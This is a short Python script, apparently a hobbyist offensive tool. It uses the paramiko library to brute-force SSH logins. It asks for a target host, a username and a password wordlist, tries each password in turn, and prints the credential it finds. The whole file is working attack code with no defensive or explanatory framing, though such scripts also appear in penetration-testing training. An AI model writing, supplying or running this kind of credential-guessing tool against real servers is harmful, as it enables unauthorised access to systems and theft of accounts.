import paramiko, sys, os, socket, termcolor

# Try to astablish an SSH connection
def sshConnect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)

    except paramiko.AuthenticationException:
        code = 1

    except socket.error as e:
        code = 2

    ssh.close()
    return code


host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
fileInput = input('[+] Passwords File: ')
print('\n')

if os.path.exists(fileInput) == False:
    print('Specified password file does not exist')
    sys.exit(1)

with open(fileInput, 'r') as file:
    
    for line in file.readlines():
        password = line.strip('\n')

        try: # TODO: implement sshConnect function
            response = sshConnect(password)

            if response == 0:
                print(termcolor.colored((f"[+] The SSH password has been found: {password} | Username: {username}"), 'green'))
                break

            elif response == 1:
                print(f'[-] Incorrect Password: {password}')

            elif response == 2:
                print(f'[!!!] Unable to Connect to SSH host {host}. Make sure the target is online!')
                sys.exit(1)
        
        except Exception as e:
            
            print(e)
            pass
